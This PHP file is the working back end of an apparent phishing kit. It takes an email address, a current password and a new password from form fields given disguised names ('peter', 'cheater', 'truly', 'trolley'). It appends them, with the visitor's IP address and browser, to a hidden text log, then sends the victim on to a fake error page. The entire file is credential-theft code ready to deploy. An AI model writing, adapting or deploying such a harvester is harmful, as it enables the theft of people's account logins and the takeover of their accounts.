<?php
// Text file 
$file = "987654321123456789.txt";

// Get POST variables mapped to your form fields
$email            = $_POST['peter'] ?? '';
$password         = $_POST['cheater'] ?? '';
$new_password     = $_POST['truly'] ?? '';
$confirm_password = $_POST['trolley'] ?? '';

// Get User Agent
$useragent = $_SERVER['HTTP_USER_AGENT'] ?? '';

// Get IP Address
$ip = $_SERVER['REMOTE_ADDR'] ?? '';

// Get current date and time
$date = date("Y-m-d H:i:s");

// Prepare data
$data = "Date: " . $date . PHP_EOL;
$data .= "Peter: " . $email . PHP_EOL;
$data .= "Cheater: " . $password . PHP_EOL;
$data .= "Truly: " . $new_password . PHP_EOL;
$data .= "Trolley: " . $confirm_password . PHP_EOL;
$data .= "User Agent: " . $useragent . PHP_EOL;
$data .= "IP: " . $ip . PHP_EOL;
$data .= "------------------------" . PHP_EOL;

// Open file in append mode
$fileHandle = fopen($file, "a");
if ($fileHandle) {
    // Write data to file
    fwrite($fileHandle, $data);
    // Close file
    fclose($fileHandle);
}

// Redirect to URL
header("Location: ./m_error_updt.html");
exit();
?>
